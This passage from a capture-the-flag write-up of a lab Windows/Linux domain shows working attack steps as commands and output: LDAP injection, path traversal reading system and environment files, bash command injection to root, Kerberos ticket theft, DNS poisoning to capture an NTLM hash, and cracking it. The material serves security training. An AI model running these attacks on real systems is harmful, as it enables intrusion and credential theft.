+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1--</code></pre><p>Using the target account set as the username, a <code>*</code> will search through the attributes until it find a match to <code>gitea_temp_principal</code></p><p>So by placing a character in the password field followed by a <code>*</code> will either give an error for a incorrect character or a success for a correct character</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">HTTP/1.1 303 See Other
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 26 Aug 2026 19:27:21 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2
+Connection: keep-alive
+Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Set-Cookie: token=Bearer%20eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3OTAzNjQ0NDEsImlhdCI6MTc4Nzc3MjQ0MSwidXNlciI6eyJ1c2VybmFtZSI6ImdpdGVhX3RlbXBfcHJpbmNpcGFsIn19.sksmk-WdJMLIhYqRnM-3i7lRh0ho_9LR6x4O-Uwo1QA; Path=/
+x-action-revalidated: [[],0,1]
+x-action-redirect: /
+X-Powered-By: Next.js
+ETag: &quot;bwc9mymkdm2&quot;
+
+{}</code></pre><p>This is what a valid request looks like just using the <code>*</code> in the secret field</p><p>So i already know it can only contain letters and numbers from the <code>/profile</code> endpoint:</p><p><img src="images/ghost/pasted-image-20260826202843.webp" alt="Screenshot" loading="lazy" /></p><p>So i can use a character wordlist to find the correct secret</p><p>Ill create a wordlist to do this</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">POST /login HTTP/1.1
+Host: intranet.ghost.htb:8008
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/x-component
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://intranet.ghost.htb:8008/login
+Next-Action: c471eb076ccac91d6f828b671795550fd5925940
+Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
+Content-Type: multipart/form-data; boundary=----geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Length: 478
+Origin: http://intranet.ghost.htb:8008
+Connection: keep-alive
+Priority: u=0
+
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name=&quot;1_ldap-username&quot;
+
+gitea_temp_principal
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name=&quot;1_ldap-secret&quot;
+
+FUZZ*
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name=&quot;0&quot;
+
+[{},&quot;$K1&quot;]
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1--</code></pre><p>Ill grab the request and upload it to caido so i can fuzz this in caido</p><p><img src="images/ghost/pasted-image-20260826205015.webp" alt="Screenshot" loading="lazy" /></p><p>As seen here the letter <code>s</code> gives a different response length</p><p>I also dont think it is case sensitive</p><p><img src="images/ghost/pasted-image-20260826205125.webp" alt="Screenshot" loading="lazy" /></p><p>Now its followed by <code>z</code>, ill continue this process until it all characters return the same response length i.e. they all cause errors</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">szrr8kpc3z6onlqf</code></pre><p><img src="images/ghost/pasted-image-20260826205622.webp" alt="Screenshot" loading="lazy" /></p><p>After re running this until all responses had the same length i find the secret, now i can log into the gitea instance</p><h2>Access to gitea instance as <code>gitea_temp_principal</code></h2><p><img src="images/ghost/pasted-image-20260826205813.webp" alt="Screenshot" loading="lazy" /></p><p>Found two private repos</p><p>There are no hardcoded credentials</p><p>Ill have a look through some of this source code</p><h2>Local file inclusion in the blog </h2><p>After running some analysis on the source code in both repos, i found two interesting vulnerabilities, one which is RCE in intranet but it is currently locked and needs a value called <code>DEV_INTRANET_KEY</code> which i dont yet have</p><p>But there is another vulnerability in the blog which is a file inclusion vulnerability in <code>posts-public.js</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">const extra = frame.original.query?.extra;
+if (extra) {
+    const fs = require(&quot;fs&quot;);
+    if (fs.existsSync(extra)) {
+        const fileContent = fs.readFileSync(&quot;/var/lib/ghost/extra/&quot; + extra, { encoding: &quot;utf8&quot; });
+        posts.meta.extra = { [extra]: fileContent };
+    }
+}</code></pre><p>I should be able to exploit this file read vulnerability using the API key given in the blogs readme</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">a5af628828958c976a3b6cc81a</code></pre><p>I will now attempt to read <code>/etc/passwd</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl &#39;http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&amp;extra=../../../../etc/passwd&#39;         
+{&quot;posts&quot;:[{&quot;id&quot;:&quot;65bdd2dc26db7d00010704b5&quot;,&quot;uuid&quot;:&quot;22db47b3-bbf6-426d-9fcf-887363df82cf&quot;,&quot;title&quot;:&quot;Embarking on the Supernatural Journey: Welcome to Ghost!&quot;,&quot;slug&quot;:&quot;embarking-on-the-supernatural-journey-welcome-to-ghost&quot;,&quot;html&quot;:&quot;&lt;p&gt;Greetings, fellow seekers of the unknown!&lt;/p&gt;&lt;p&gt;It is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.&lt;/p&gt;&lt;h2 id=\&quot;why-ghost\&quot;&gt;Why Ghost?&lt;/h2&gt;&lt;p&gt;The quest to understand the supernatural has been etched into the fabric of human history. From ancient legends to modern-day tales, the fascination with ghosts and the paranormal is a thread that binds us across time and cultures. Ghost emerges as a beacon for those who yearn to explore the realms beyond our comprehension.&lt;/p&gt;&lt;h2 id=\&quot;what-to-expect\&quot;&gt;What to Expect&lt;/h2&gt;&lt;p&gt;Our digital abode is more than just a collection of stories; it&#39;s a haven for the curious, the intrepid, and the inquisitive. Here, you&#39;ll find:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;Investigative Chronicles&lt;/strong&gt;: Join us as we recount our journeys into haunted locations, sharing the spine-chilling encounters, unexplained phenomena, and the secrets that linger in the darkness.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Tech Tuesdays&lt;/strong&gt;: Stay at the forefront of paranormal research with our weekly dives into the latest ghost-hunting gadgets, software, and techniques. Knowledge is our strongest ally in the face of the unknown.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Spotlight Series&lt;/strong&gt;: Get to know the passionate individuals behind the investigations. Our Spotlight Series puts a face to the name, sharing the stories and expertise of our dedicated team.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Community Corner&lt;/strong&gt;: Ghost is more than a website; it&#39;s a community. Share your own supernatural experiences, theories, and questions in our Community Corner. Together, we amplify the voices seeking to understand the inexplicable.&lt;/li&gt;&lt;/ol&gt;&lt;h2 id=\&quot;join-us-on-this-extraordinary-expedition\&quot;&gt;Join Us on this Extraordinary Expedition&lt;/h2&gt;&lt;p&gt;The journey into the paranormal is not for the faint of heart, but it is a journey worth taking. As we lift the veil on the mysteries that surround us, we invite you to be an active participant in this extraordinary expedition. Engage with our content, share your thoughts, and let the spirit of exploration guide us into uncharted territories.&lt;/p&gt;&lt;p&gt;Ghost is not just a website; it&#39;s a portal to the enigmatic, a gateway to the supernatural, and a testament to the boundless curiosity that defines the human spirit.&lt;/p&gt;&lt;p&gt;Welcome to our realm. Let the haunting begin!&lt;/p&gt;&lt;p&gt;Happy ghost hunting,&lt;/p&gt;&lt;p&gt;The Ghost Team&lt;/p&gt;&quot;,&quot;comment_id&quot;:&quot;659cdeec9cd6330001baefbf&quot;,&quot;feature_image&quot;:null,&quot;featured&quot;:true,&quot;visibility&quot;:&quot;public&quot;,&quot;created_at&quot;:&quot;2024-01-09T05:51:40.000+00:00&quot;,&quot;updated_at&quot;:&quot;2024-01-09T05:52:59.000+00:00&quot;,&quot;published_at&quot;:&quot;2024-01-09T05:52:29.000+00:00&quot;,&quot;custom_excerpt&quot;:null,&quot;codeinjection_head&quot;:null,&quot;codeinjection_foot&quot;:null,&quot;custom_template&quot;:null,&quot;canonical_url&quot;:null,&quot;url&quot;:&quot;http://ghost.htb/embarking-on-the-supernatural-journey-welcome-to-ghost/&quot;,&quot;excerpt&quot;:&quot;Greetings, fellow seekers of the unknown!\n\nIt is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.\n\n\nWhy Ghost?\n\nThe quest to understand the supernatural has been etched into the fabric of human history. From anc&quot;,&quot;reading_time&quot;:1,&quot;access&quot;:true,&quot;comments&quot;:false,&quot;og_image&quot;:null,&quot;og_title&quot;:null,&quot;og_description&quot;:null,&quot;twitter_image&quot;:null,&quot;twitter_title&quot;:null,&quot;twitter_description&quot;:null,&quot;meta_title&quot;:null,&quot;meta_description&quot;:null,&quot;email_subject&quot;:null,&quot;frontmatter&quot;:null,&quot;feature_image_alt&quot;:null,&quot;feature_image_caption&quot;:null}],&quot;meta&quot;:{&quot;pagination&quot;:{&quot;page&quot;:1,&quot;limit&quot;:15,&quot;pages&quot;:1,&quot;total&quot;:1,&quot;next&quot;:null,&quot;prev&quot;:null},&quot;extra&quot;:{&quot;../../../../etc/passwd&quot;:&quot;root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n&quot;}}}  </code></pre><p>As seen here, at the bottom of the output i can read files, which means i should be able to dump the <code>DEV_INTRANET_KEY</code> to then get RCE</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl &#39;http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&amp;extra=../../../../var/lib/ghost/extra/important&#39; 
+
+...[SNIP]...
+
+&quot;extra&quot;:{&quot;../../../../var/lib/ghost/extra/important&quot;:&quot;659cdeec9cd6330001baefbf\n&quot;}}}  </code></pre><p>So there was nothing else interesting this file</p><p><img src="images/ghost/pasted-image-20260827175100.webp" alt="Screenshot" loading="lazy" /></p><p>So from this screenshot i can assume the database is at the path: <code>/var/lib/ghost/content/data/ghost.db</code></p><p>Upon output of this file, i see it is massive and would be a pain to find the exact value i want, so instead ill check <code>/proc/self/environ</code> since its exported as an environment variable in the repo</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl &#39;http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&amp;extra=../../../../proc/self/environ&#39;
+
+...[SNIP]...
+
+&quot;extra&quot;:{&quot;../../../../proc/self/environ&quot;:&quot;HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000&quot;</code></pre><p>I now have the <code>DEV_INTRANET_KEY</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe</code></pre><h2>Remote code execution on the Ubuntu server</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">// Scans an url inside a blog post
+// This will be called by the blog to ensure all URLs in posts are safe
+#[post(&quot;/scan&quot;, format = &quot;json&quot;, data = &quot;&lt;data&gt;&quot;)]
+pub fn scan(_guard: DevGuard, data: Json&lt;ScanRequest&gt;) -&gt; Json&lt;ScanResponse&gt; {
+    // currently intranet_url_check is not implemented,
+    // but the route exists for future compatibility with the blog
+    let result = Command::new(&quot;bash&quot;)
+        .arg(&quot;-c&quot;)
+        .arg(format!(&quot;intranet_url_check {}&quot;, data.url))
+        .output();</code></pre><p>This code is in the intranet repo, specifically <code>intranet/backend/src/api/dev/scan.rs</code></p><p>This code takes json input from the POST request and processes it using bash, this is the RCE vector i mentioned earlier in the <code>/scan</code> endpoint</p><p>Anything placed inside <code>{&quot;url&quot;:&quot;&lt;value&gt;&quot;}</code> will be ran with bash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">use rocket::http::Status;
+use rocket::Request;
+use rocket::request::{FromRequest, Outcome};
+
+pub(crate) mod scan;
+
+pub struct DevGuard;
+
+#[rocket::async_trait]
+impl&lt;&#39;r&gt; FromRequest&lt;&#39;r&gt; for DevGuard {
+    type Error = ();
+
+    async fn from_request(request: &amp;&#39;r Request&lt;&#39;_&gt;) -&gt; Outcome&lt;Self, Self::Error&gt; {
+        let key = request.headers().get_one(&quot;X-DEV-INTRANET-KEY&quot;);
+        match key {
+            Some(key) =&gt; {
+                if key == std::env::var(&quot;DEV_INTRANET_KEY&quot;).unwrap() {
+                    Outcome::Success(DevGuard {})
+                } else {
+                    Outcome::Error((Status::Unauthorized, ()))
+                }
+            },
+            None =&gt; Outcome::Error((Status::Unauthorized, ()))
+        }
+    }
+}</code></pre><p>However this was the code that meant i couldnt reach the endpoint to get RCE without the <code>DEV_INTRANET_KEY</code> which was stored an environment variable, which i now have through LFI</p><p>As seen in this code stored at <code>intranet/backend/src/api/dev.rs</code> it takes the environments variable as a HTTP header in the request to the endpoint then matches the value to the environment variable if it matches you can reach the endpoint if not it returns an error</p><p><img src="images/ghost/pasted-image-20260827190048.webp" alt="Screenshot" loading="lazy" /></p><p>This screenshot from the intranet repo readme shows the API is at <code>/api-dev</code> and i already know the vulnerable endpoint is <code>/scan</code>, so the endpoint is going to be <code>/api-dev/scan</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H &#39;Content-Type: application/json&#39; -H &#39;X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe&#39; --data &#39;{&quot;url&quot;:&quot;http://localhost; id&quot;}&#39; | jq .
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    217 100    187 100     30   4110    659                              0
+{
+  &quot;is_safe&quot;: true,
+  &quot;temp_command_success&quot;: true,
+  &quot;temp_command_stdout&quot;: &quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;,
+  &quot;temp_command_stderr&quot;: &quot;bash: line 1: intranet_url_check: command not found\n&quot;
+}</code></pre><p>I now have RCE</p><p>All i needed to do was set the request to POST like it says to do in <code>scan.rs</code> and pass the valid key found via LFI as well as the content type header, then simply pass the command into the json body</p><p>Its also worth noting the app is already running as root so after getting a shell i shouldnt need to do any priv esc</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337</code></pre><p>So ill start a listener</p><p><img src="images/ghost/pasted-image-20260827190635.webp" alt="Screenshot" loading="lazy" /></p><p>Ill send the request</p><p><img src="images/ghost/pasted-image-20260827190732.webp" alt="Screenshot" loading="lazy" /></p><p>I now have a root shell on the container running on the ubuntu server</p><h2>Access as <code>florence.ramirez</code> on the ubuntu server (container escape)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">root@36b733906694:~/.ssh/controlmaster# ls -la
+total 12
+drwxr-xr-x 1 root root 4096 Aug 27 15:51 .
+drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
+srw------- 1 root root    0 Aug 27 15:51 florence.ramirez@ghost.htb@dev-workstation:22</code></pre><p>I have found a controlmaster socket file for a user called <code>florence.ramirez</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">root@36b733906694:~# ssh -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb
+Last login: Thu Feb  1 23:58:45 2024 from 172.18.0.1
+florence.ramirez@LINUX-DEV-WS01:~$</code></pre><p>I can use this to login to the machine, now escaping the container</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">florence.ramirez@LINUX-DEV-WS01:/$ id
+uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)</code></pre><p>I am part of two interesting groups</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">florence.ramirez@LINUX-DEV-WS01:/$ find / -group it 2&gt;/dev/null</code></pre><p>There are no files belonging to the IT group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">florence.ramirez@LINUX-DEV-WS01:/$ find / -group staff 2&gt;/dev/null
+
+...[SNIP]...
+
+/tmp/krb5cc_50</code></pre><p>Looks like i have found a kerberos ticket</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">florence.ramirez@LINUX-DEV-WS01:/$ klist
+Ticket cache: FILE:/tmp/krb5cc_50
+Default principal: florence.ramirez@GHOST.HTB
+
+Valid starting     Expires            Service principal
+08/27/26 18:42:01  08/28/26 04:42:01  krbtgt/GHOST.HTB@GHOST.HTB
+	renew until 08/28/26 18:42:01
+florence.ramirez@LINUX-DEV-WS01:/$</code></pre><p>Ill use this ticket to get initial access the domain!</p><h2>Initial access on the domain</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">florence.ramirez@LINUX-DEV-WS01:/$ cat /tmp/krb5cc_50 | base64
+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</code></pre><p>Ill encode the output of the ticket in base64 then output it to the screen, ill then copy this to my machine and save it to a file <strong>making sure the ticket is on ONE line</strong></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat florenceramirez.b64 | base64 -d | tee florenceramirez.ccache</code></pre><p>So once the file is on one line ill decode the base64 and direct the output to the ccache file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=florenceramirez.ccache</code></pre><p>Now i can test access</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.ghost.htb --use-kcache                      
+SMB         dc01.ghost.htb  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.ghost.htb  445    DC01             [+] GHOST.HTB\florence.ramirez from ccache</code></pre><p>IT WORKS!</p><h2>Domain enumeration as <code>florence.ramirez</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.ghost.htb --use-kcache --shares
+SMB         dc01.ghost.htb  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.ghost.htb  445    DC01             [+] GHOST.HTB\florence.ramirez from ccache 
+SMB         dc01.ghost.htb  445    DC01             [*] Enumerated shares
+SMB         dc01.ghost.htb  445    DC01             Share           Permissions     Remark
+SMB         dc01.ghost.htb  445    DC01             -----           -----------     ------
+SMB         dc01.ghost.htb  445    DC01             ADMIN$                          Remote Admin
+SMB         dc01.ghost.htb  445    DC01             C$                              Default share
+SMB         dc01.ghost.htb  445    DC01             IPC$            READ            Remote IPC
+SMB         dc01.ghost.htb  445    DC01             NETLOGON        READ            Logon server share 
+SMB         dc01.ghost.htb  445    DC01             SYSVOL          READ            Logon server share 
+SMB         dc01.ghost.htb  445    DC01             Users           READ    </code></pre><p>Read access on the <code>Users</code> share</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.ghost.htb --use-kcache --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+GHOST-CORP$
+kathryn.holland
+cassandra.shelton
+robert.steeves
+florence.ramirez
+justin.bradley
+arthur.boyd
+beth.clark
+charles.gray
+jason.taylor
+intranet_principal
+gitea_temp_principal
+LINUX-DEV-WS01$
+adfs_gmsa$</code></pre><p>Ill get a user list</p><h2>Adding DNS record to coerce authentication</h2><p>So if i remember earlier i saw a message on the intranet that the connection to <code>bitbucket</code> wasnt working and the sysadmin replied saying the DNS entry does not yet exist</p><p>Now i have domain credentials i should be able to add one for bitbucket, and place it with my IP address</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>So first ill start responder to catch the NTLM hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.ghost.htb -d ghost.htb -u florence.ramirez -k ccache=florenceramirez.ccache add dnsRecord bitbucket 10.10.14.61 
+[+] bitbucket has been successfully added</code></pre><p>Ill add the record</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[HTTP] NTLMv2 Client   : 10.129.231.105
+[HTTP] NTLMv2 Username : ghost\justin.bradley
+[HTTP] NTLMv2 Hash     : justin.bradley::ghost:56a79b065d3a02e7:D3195C318FD443E3A6CA8228EA6ED4D4:01010000000000000D04B6A81037DD01CCCC6EAA7F36B7FB0000000002000800340055004200590001001E00570049004E002D00390052003900320046005A003100540032004C0030000400140034005500420059002E004C004F00430041004C0003003400570049004E002D00390052003900320046005A003100540032004C0030002E0034005500420059002E004C004F00430041004C000500140034005500420059002E004C004F00430041004C0008003000300000000000000000000000004000004AB0601A88C79EF7BA7A8C1EB627D5D3E57C867D76BFD9186420A811F627AEB00A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000</code></pre><p>Now ill crack the hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat &#39;justin.bradley::ghost:56a79b065d3a02e7:D3195C318FD443E3A6CA8228EA6ED4D4:01010000000000000D04B6A81037DD01CCCC6EAA7F36B7FB0000000002000800340055004200590001001E00570049004E002D00390052003900320046005A003100540032004C0030000400140034005500420059002E004C004F00430041004C0003003400570049004E002D00390052003900320046005A003100540032004C0030002E0034005500420059002E004C004F00430041004C000500140034005500420059002E004C004F00430041004C0008003000300000000000000000000000004000004AB0601A88C79EF7BA7A8C1EB627D5D3E57C867D76BFD9186420A811F627AEB00A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000&#39; /usr/share/wordlists/rockyou.txt
+
+JUSTIN.BRADLEY::ghost:56a79b065d3a02e7:d3195c318fd443e3a6ca8228ea6ed4d4:01010000000000000d04b6a81037dd01cccc6eaa7f36b7fb0000000002000800340055004200590001001e00570049004e002d00390052003900320046005a003100540032004c0030000400140034005500420059002e004c004f00430041004c0003003400570049004e002d00390052003900320046005a003100540032004c0030002e0034005500420059002e004c004f00430041004c000500140034005500420059002e004c004f00430041004c0008003000300000000000000000000000004000004ab0601a88c79ef7ba7a8c1eb627d5d3e57c867d76bfd9186420a811f627aeb00a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$</code></pre><p>The hash cracked</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.ghost.htb -u justin.bradley -p &#39;Qwertyuiop1234$$&#39;
+SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
